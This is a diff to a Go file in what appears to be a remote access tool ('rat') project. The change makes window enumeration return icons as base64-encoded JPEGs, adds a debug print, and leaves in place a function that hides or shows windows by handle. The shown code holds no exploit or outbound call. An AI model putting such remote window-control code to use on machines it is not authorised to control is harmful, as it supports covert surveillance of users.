@@ -6,6 +6,11 @@ package windows
 import "C"
 
 import (
+	"bytes"
+	"encoding/base64"
+	"fmt"
+	"image"
+	"image/jpeg"
 	"rat/shared"
 	"unsafe"
 )
@@ -18,8 +23,6 @@ var Windows []shared.Window
 func WindowCallback(w C.Frame) {
 	title := C.GoString(w.title)
 
-	icon := getIcon(w.icon)
-
 	window := shared.Window{
 		Handle:  int(w.handle),
 		Title:   title,
@@ -30,8 +33,10 @@ func WindowCallback(w C.Frame) {
 			Width:  int(w.rect.width),
 			Height: int(w.rect.height),
 		},
-		Icon: icon,
+		Icon: getEncodedIcon(w.icon),
 	}
+
+	fmt.Println("encoded icon, is", len(window.Icon))
 
 	Windows = append(Windows, window)
 }
@@ -46,7 +51,12 @@ func SetDisplayState(handle int, visible bool) {
 	C.SetDisplayState(C.int(handle), C.bool(visible))
 }
 
-func getIcon(icon C.Icon) shared.Icon {
+// getEncodedIcon returns a base64 encoded JPG image with default dimensions
+func getEncodedIcon(icon C.Icon) string {
+	if icon.data == nil {
+		return ""
+	}
+
 	width := int(icon.width)
 	height := int(icon.height)
 
@@ -56,9 +66,14 @@ func getIcon(icon C.Icon) shared.Icon {
 		buf = C.GoBytes(unsafe.Pointer(icon.data), C.int(len))
 	}
 
-	return shared.Icon{
-		Width:  width,
-		Height: height,
-		Data:   buf,
-	}
+	var buffer bytes.Buffer
+	jpeg.Encode(&buffer, &image.RGBA{
+		Pix:    buf,
+		Stride: width * 4,
+		Rect:   image.Rect(0, 0, width, height),
+	}, &jpeg.Options{
+		Quality: 75,
+	})
+
+	return base64.StdEncoding.EncodeToString(buffer.Bytes())
 }
